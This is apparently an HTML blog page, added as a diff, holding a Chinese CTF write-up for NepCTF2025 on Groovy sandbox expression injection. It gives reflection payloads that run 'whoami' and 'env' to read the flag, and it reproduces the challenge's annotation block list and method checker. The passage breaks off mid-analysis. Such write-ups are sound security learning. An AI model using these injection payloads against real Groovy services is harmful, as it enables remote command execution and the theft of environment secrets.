@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="WebeasyGooGooVVVY考的是沙盒环境的Groovy 表达式注入，发现正常的执行命令的类被过滤掉了，后面想起来可以用反射去打 搜到一篇文章：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;TWX521&#x2F;p&#x2F;17916224.html 1java.lang.String.class.forName(&quot;java.lang.Runtime&quot;).getRuntime().ex">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NepCTF2025">
+<meta property="og:url" content="https://wanth3f1ag.top/2025/07/25/NepCTF2025/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="WebeasyGooGooVVVY考的是沙盒环境的Groovy 表达式注入，发现正常的执行命令的类被过滤掉了，后面想起来可以用反射去打 搜到一篇文章：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;TWX521&#x2F;p&#x2F;17916224.html 1java.lang.String.class.forName(&quot;java.lang.Runtime&quot;).getRuntime().ex">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250725193910495.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250726031051869.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250726032302337.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250729105943641.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250729110039455.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250729223430058.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250729223648725.png">
+<meta property="article:published_time" content="2025-07-25T11:36:11.000Z">
+<meta property="article:modified_time" content="2025-08-04T08:57:26.232Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="NepCTF2025">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250725193910495.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>NepCTF2025</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">H0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">A6out</a></li><!--
+     --><!--
+       --><li><a href="/tags/">T6gs</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Catagory</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">s4arch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/07/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BFastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/07/18/Java%E5%B8%B8%E7%94%A8%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/07/25/NepCTF2025/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/07/25/NepCTF2025/&text=NepCTF2025"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/07/25/NepCTF2025/&title=NepCTF2025"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/07/25/NepCTF2025/&is_video=false&description=NepCTF2025"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NepCTF2025&body=Check out this article: https://wanth3f1ag.top/2025/07/25/NepCTF2025/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/07/25/NepCTF2025/&title=NepCTF2025"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/07/25/NepCTF2025/&title=NepCTF2025"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/07/25/NepCTF2025/&title=NepCTF2025"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/07/25/NepCTF2025/&title=NepCTF2025"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/07/25/NepCTF2025/&name=NepCTF2025&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/07/25/NepCTF2025/&t=NepCTF2025"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyGooGooVVVY"><span class="toc-number">2.</span> <span class="toc-text">easyGooGooVVVY</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#safe-bank-%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">safe_bank(复现)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RevengeGooGooVVVY"><span class="toc-number">4.</span> <span class="toc-text">RevengeGooGooVVVY</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E5%B1%9E%E6%80%A7%E8%AE%BF%E9%97%AE%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%BB%95%E8%BF%87"><span class="toc-number">4.1.</span> <span class="toc-text">方法一:属性访问表达式绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-getClass-%E6%96%B9%E6%B3%95%E7%BB%95%E8%BF%87"><span class="toc-number">4.2.</span> <span class="toc-text">方法二:getClass()方法绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JavaSeri"><span class="toc-number">5.</span> <span class="toc-text">JavaSeri</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro550"><span class="toc-number">5.1.</span> <span class="toc-text">#shiro550</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        NepCTF2025
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wanTh3flag</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-07-25T11:36:11.000Z" class="dt-published" itemprop="datePublished">2025-07-25</time>
+        
+        (Updated: <time datetime="2025-08-04T08:57:26.232Z" class="dt-updated" itemprop="dateModified">2025-08-04</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E8%B5%9B%E9%A2%98wp/">赛题wp</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/NepCTF2025/" rel="tag">NepCTF2025</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h2 id="easyGooGooVVVY"><a href="#easyGooGooVVVY" class="headerlink" title="easyGooGooVVVY"></a>easyGooGooVVVY</h2><p>考的是沙盒环境的Groovy 表达式注入，发现正常的执行命令的类被过滤掉了，后面想起来可以用反射去打</p>
+<p>搜到一篇文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/TWX521/p/17916224.html">https://www.cnblogs.com/TWX521/p/17916224.html</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.String.class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;whoami&quot;</span>).getText()</span><br></pre></td></tr></table></figure>
+
+<p>任意一个内置类的原型类都会有forName这个静态方法，那就很好做了</p>
+<p><img src="/../image/achieve/202411/NepCTF2025/image-20250725193910495.png" alt="image-20250725193910495"></p>
+<p>能回显，然后也没过滤什么命令，直接打就行，flag在env环境变量中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.String.class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;env&quot;</span>).getText()</span><br></pre></td></tr></table></figure>
+
+<h2 id="safe-bank-复现"><a href="#safe-bank-复现" class="headerlink" title="safe_bank(复现)"></a>safe_bank(复现)</h2><p>放在另一篇专门单开的文章里了</p>
+<h2 id="RevengeGooGooVVVY"><a href="#RevengeGooGooVVVY" class="headerlink" title="RevengeGooGooVVVY"></a>RevengeGooGooVVVY</h2><p>有两份源码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//phase3purifiler.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> org.example.expressinject.Test.Groovy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> groovy.lang.Grab;</span><br><span class="line"><span class="keyword">import</span> groovy.transform.ASTTest;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.ast.*;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.classgen.GeneratorContext;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.control.CompilationFailedException;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.control.CompilationUnit;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.control.CompilePhase;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.control.SourceUnit;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.control.customizers.CompilationCustomizer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Annotation;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Phase3Purifiler</span> <span class="keyword">extends</span> <span class="title class_">CompilationCustomizer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; BLOCKED_TRANSFORMS = Collections.unmodifiableList(Arrays.asList(</span><br><span class="line">            <span class="string">&quot;ASTTest&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Grab&quot;</span>,</span><br><span class="line">            <span class="string">&quot;GrabConfig&quot;</span>,</span><br><span class="line">            <span class="string">&quot;GrabExclude&quot;</span>,</span><br><span class="line">            <span class="string">&quot;GrabResolver&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Grapes&quot;</span>,</span><br><span class="line">            <span class="string">&quot;AnnotationCollector&quot;</span></span><br><span class="line">    ));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Phase3Purifiler</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(CompilePhase.CONVERSION);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">call</span><span class="params">(SourceUnit source, GeneratorContext context, ClassNode classNode)</span> <span class="keyword">throws</span> CompilationFailedException &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RejectASTTransformsVisitor</span>(source).visitClass(classNode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doPhaseOperation</span><span class="params">(CompilationUnit unit)</span> <span class="keyword">throws</span> CompilationFailedException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPhaseOperation(unit);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">needSortedInput</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.needSortedInput();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">RejectASTTransformsVisitor</span> <span class="keyword">extends</span> <span class="title class_">ClassCodeVisitorSupport</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> SourceUnit source;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">RejectASTTransformsVisitor</span><span class="params">(SourceUnit source)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.source = source;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> SourceUnit <span class="title function_">getSourceUnit</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> source;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitAnnotations</span><span class="params">(AnnotatedNode node)</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (AnnotationNode an : node.getAnnotations()) &#123;</span><br><span class="line">                <span class="keyword">for</span> (String blockedAnnotation : BLOCKED_TRANSFORMS) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (an.getClassNode().getName().contains(blockedAnnotation)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Annotation &quot;</span> + blockedAnnotation + <span class="string">&quot; cannot be used in the sandbox.&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitImports</span><span class="params">(ModuleNode node)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (ImportNode importNode : node.getImports()) &#123;</span><br><span class="line">                    checkImportForBlockedAnnotation(importNode);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span> (ImportNode importStaticNode : node.getStaticImports().values()) &#123;</span><br><span class="line">                    checkImportForBlockedAnnotation(importStaticNode);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">checkImportForBlockedAnnotation</span><span class="params">(ImportNode node)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (node != <span class="literal">null</span> &amp;&amp; node.getType() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (String blockedAnnotation : BLOCKED_TRANSFORMS) &#123;</span><br><span class="line">                <span class="keyword">if</span> (node.getType().getName().contains(blockedAnnotation)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Annotation &quot;</span> + node.getType().getName() + <span class="string">&quot; cannot be used in the sandbox.&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这是一个Groovy编译定制器，用于在编译阶段检查和阻止特定的AST转换注解。就是Groovy 源码刚刚被解析成抽象语法树（AST）之后执行的，我们看看这里的注解黑名单</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; BLOCKED_TRANSFORMS = Collections.unmodifiableList(Arrays.asList(</span><br><span class="line">        <span class="string">&quot;ASTTest&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Grab&quot;</span>,</span><br><span class="line">        <span class="string">&quot;GrabConfig&quot;</span>,</span><br><span class="line">        <span class="string">&quot;GrabExclude&quot;</span>,</span><br><span class="line">        <span class="string">&quot;GrabResolver&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Grapes&quot;</span>,</span><br><span class="line">        <span class="string">&quot;AnnotationCollector&quot;</span></span><br><span class="line">));</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>@Grab, @Grapes 等: 这是 <strong>Groovy Grapes</strong> 依赖管理系统的注解。他们在运行时能<strong>从互联网上动态下载并加载任意的 JAR 包</strong></li>
+<li>@ASTTest: 用于在编译时对 AST 进行测试和断言，可以被滥用来执行任意代码或修改 AST，。</li>
+<li>@AnnotationCollector: 可以将多个注解“打包”成一个自定义注解，可能被用来隐藏其他被禁止的注解，从而绕过检查。</li>
+</ul>
+<p>所以这个代码主要是对一些危险的注解进行一个禁用，防止在AST语法树阶段解析注解的时候会执行自定义注解处理器从而导致一些危险的注解实现代码执行。</p>
+<p>我们主要看第二个</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//customgroovypurifier.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> org.example.expressinject.Test.Groovy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.ast.ClassNode;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.ast.expr.Expression;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.ast.expr.MethodCallExpression;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.control.customizers.SecureASTCustomizer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomGroovyPurifier</span> <span class="keyword">extends</span> <span class="title class_">SecureASTCustomizer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Set&lt;String&gt; STRING_METHODS = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">SecureASTCustomizer</span> <span class="variable">secureASTCustomizer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecureASTCustomizer</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> SecureASTCustomizer <span class="title function_">CreateASTCustomizer</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        secureASTCustomizer.addExpressionCheckers(expr -&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (expr <span class="keyword">instanceof</span> MethodCallExpression) &#123;</span><br><span class="line">                <span class="type">MethodCallExpression</span> <span class="variable">methodCall</span> <span class="operator">=</span> (MethodCallExpression) expr;</span><br><span class="line">                <span class="type">Expression</span> <span class="variable">objectExpr</span> <span class="operator">=</span> methodCall.getObjectExpression();</span><br><span class="line">                <span class="type">ClassNode</span> <span class="variable">type</span> <span class="operator">=</span> objectExpr.getType();</span><br><span class="line">                type.getClass();</span><br><span class="line">                <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> type.getName();</span><br><span class="line">                <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> methodCall.getMethodAsString();</span><br><span class="line">                <span class="keyword">if</span> (typeName.equals(<span class="string">&quot;java.lang.String&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (STRING_METHODS.contains(methodName)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Calling &quot;</span>+methodName+<span class="string">&quot;  on &quot;</span>+ <span class="string">&quot;String is not allowed&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;execute&quot;</span>)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Calling &quot;</span>+methodName+<span class="string">&quot; on &quot;</span>+ <span class="string">&quot;is not allowed&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">        secureASTCustomizer.setClosuresAllowed(<span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">return</span> secureASTCustomizer;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (Method method : String.class.getDeclaredMethods()) &#123;</span><br><span class="line">            STRING_METHODS.add(method.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里的话在我们逐步分析</p>
+<p>可以看到，<code>secureASTCustomizer.addExpressionCheckers(expr -&gt;</code>这里的话会将我们沙箱中每个表达式都在此进行处理，那我们重点看里面的处理逻辑</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (expr <span class="keyword">instanceof</span> MethodCallExpression) &#123;</span><br><span class="line">                <span class="type">MethodCallExpression</span> <span class="variable">methodCall</span> <span class="operator">=</span> (MethodCallExpression) expr;</span><br><span class="line">                <span class="type">Expression</span> <span class="variable">objectExpr</span> <span class="operator">=</span> methodCall.getObjectExpression();</span><br><span class="line">                <span 